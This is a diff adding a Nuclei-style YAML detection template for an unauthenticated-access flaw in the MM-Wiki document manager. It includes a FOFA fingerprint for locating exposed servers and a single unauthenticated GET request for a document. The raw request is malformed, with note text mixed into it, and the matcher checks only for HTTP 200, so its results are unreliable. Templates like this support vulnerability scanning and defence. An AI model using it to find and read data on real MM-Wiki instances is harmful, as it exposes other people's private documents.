@@ -1,0 +1,46 @@
+id: poc-opgb0q5ilde96iwg
+info:
+  name: MM-Wiki 文档管理器未授权访问漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/opgb0q5ilde96iwg'
+  tags: unauth,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: opgb0q5ilde96iwg
+    fofa: header="mmwikissid"
+http:
+- raw:
+  - 'GET /page/display?document_id=1 HTTP/1.1
+
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
+
+
+    Connection: close
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
